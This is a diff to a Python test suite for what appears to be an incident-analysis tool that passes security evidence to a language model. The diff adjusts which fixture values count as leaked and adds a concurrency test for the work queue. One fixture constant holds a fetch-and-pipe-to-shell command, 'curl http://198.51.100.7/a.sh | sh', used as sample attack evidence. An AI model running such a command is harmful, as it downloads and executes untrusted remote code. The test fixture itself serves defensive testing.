@@ -11,6 +11,7 @@ from __future__ import annotations
 
 import dataclasses
 import json
+import threading
 import time
 from datetime import UTC, datetime, timedelta
 from pathlib import Path
@@ -53,7 +54,9 @@ SRC_IP = "203.0.113.7"
 CMD = "curl http://198.51.100.7/a.sh | sh"
 REMOTE_IP = "198.51.100.7"
 
-REAL_VALUES = [HOST, USER, DEVICE_IP, SRC_IP, REMOTE_IP, "a.sh"]
+# "a.sh" in CMD is a file name, not an entity: it reaches the model
+# verbatim by design, so it is not a leaked real value.
+REAL_VALUES = [HOST, USER, DEVICE_IP, SRC_IP, REMOTE_IP]
 
 PARALLEL_FIXTURE = Path("tests/fixtures_llm/spark_tool_calls_parallel.json")
 
@@ -1859,3 +1862,65 @@ def test_resume_after_busy_reuses_steps(
     assert [step["n"] for step in _step_rows(db, incident_id)] == [1]
     assert len(stub2.calls) == 1
     _assert_no_raw(stub2.calls)
+
+
+def test_concurrent_analyses_do_not_steal_jobs(
+    analysis_db: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Two incidents analysed at once: both resolve, no busy, no stealing."""
+    db = analysis_db
+    adapter = FakeAdapter([_make_auth("ev1", 5), _make_process("ev2", 9)])
+    rows = [
+        _loader_row(_make_auth("ev1", 5), host=HOST, user=USER, src_ip=SRC_IP),
+        _loader_row(_make_process("ev2", 9), host=HOST, user=USER),
+    ]
+    first = _seed_incident(db, key="corr-conc-a", uids=("ev1", "ev2"))
+    second = _seed_incident(db, key="corr-conc-b", uids=("ev1", "ev2"))
+    other = _seed_incident(db, key="corr-conc-other", uids=("ev1", "ev2"))
+    for incident_id in (first, second, other):
+        _seed_triage(db, incident_id)
+    queue = WorkQueue(db)
+    other_job = queue.enqueue(
+        "analysis", {"incident_id": other}, dedupe_key=f"analysis:incident:{other}:v1"
+    )
+    _patch_transport(monkeypatch, [_script_attempt(_verdict_body())])
+    outcomes: dict[int, Any] = {}
+    errors: dict[int, BaseException] = {}
+
+    def _run_one(incident_id: int) -> None:
+        try:
+            outcomes[incident_id] = run_analysis(
+                incident_id,
+                database_url=db,
+                adapter=adapter,
+                evidence_loader=lambda _incident: list(rows),
+                backend=_cloud_backend(),
+                prices=_zero_prices("stub-cloud"),
+                egress_filter=_egress(),
+            )
+        except BaseException as exc:  # pragma: no cover - asserted below
+            errors[incident_id] = exc
+
+    threads = [
+        threading.Thread(target=_run_one, args=(incident_id,))
+        for incident_id in (first, second)
+    ]
+    for thread in threads:
+        thread.start()
+    for thread in threads:
+        thread.join(timeout=120)
+    assert not errors
+    assert outcomes[first].status == "resolved"
+    assert outcomes[second].status == "resolved"
+    # No duplicate spend: exactly one recorded attempt per incident.
+    assert len(_attempt_rows(db, first)) == 1
+    assert len(_attempt_rows(db, second)) == 1
+    assert _attempt_rows(db, other) == []
+    with psycopg.connect(db) as conn:
+        with conn.cursor() as cur:
+            cur.execute(
+                "SELECT status, locked_by FROM work_queue WHERE id = %s",
+                (other_job,),
+            )
+            row = cur.fetchone()
+    assert row is not None and row[0] == "pending" and row[1] is None
